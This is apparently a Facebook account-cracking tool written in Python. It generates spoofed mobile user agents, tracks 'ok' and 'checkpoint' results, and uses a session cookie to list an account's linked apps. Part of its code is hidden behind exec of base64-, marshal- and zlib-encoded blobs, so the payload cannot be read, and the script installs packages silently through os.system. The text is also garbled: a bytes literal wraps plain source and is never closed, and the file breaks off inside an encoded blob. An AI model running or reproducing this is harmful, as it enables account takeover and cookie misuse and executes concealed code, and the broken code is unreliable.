#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 3.0
#______CODING BY: U7P4L 1N
#______GITHUB : https://github.com/U7P4L-IN
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'#-*-coding:utf-8-*-
#!/usr/bin/python3
#!/coding by SYED JAKI GREAT

import os
import uuid,base64,hashlib,zlib,subprocess,time,platform
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mGREAT-143\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.001)
    os.system('pip install futures')
try: 
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mGREAT\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.001)
    os.system('pip install bs4')
#---------------------[SEQURITY]------------------#

#━━━━[ COLORS ]━━━━#
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
my_color = [white,blue,green];warna = random.choice(my_color)
loop = 0
oks = []
cps = []
id = []
ck = []
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
today = '\x1b[38;5;46m'+str(hari)+'\033[1;97m-\x1b[38;5;46m'+str(bulan)+''
#--------------------------------[NORMAL MTD]--------------------------------#
import requests,random

def uoa():
    ver = str(random.choice(range(77, 500)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/535.2 '''
def uma():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    #exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''
def upa():
    version=random.choice(["10","11","12","13","14"])
    model=random.choice(["SM-E546B","SM-A135F","SM-N981B","SM-A536E","SM-M315F","SM-A528B","SM-N960U","SM-S536DL","SM-S918U","SM-S536DL","SM-S918U","SM-A202F","SM-S928B","SM-A8050","SM-A7050","SM-A325F"])
    build = random.choice(['UP1A','RP1A','SP1A','TP1A'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''
#=================[apk-chaker]==============#
def fire():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    return f"Mozilla/5.0 (Linux; Linux x86_64) AppleWebKit/537.30 (KHTML, like Gecko) Chrome/{ver}.0.3760.{ver2} Safari/535"
#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s{P}[%s×%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'[🔥] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'[✔] %s ☑ Your Expired Apps ☑    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print("%s═════════════════════%s═════════════════════%s"%(M,H,P))    
#--------------------------------[VERSON]--------------------------------#
import marshal,zlib,base64
exec(marshal.loads(zlib.decompress(base64.b64decode(b'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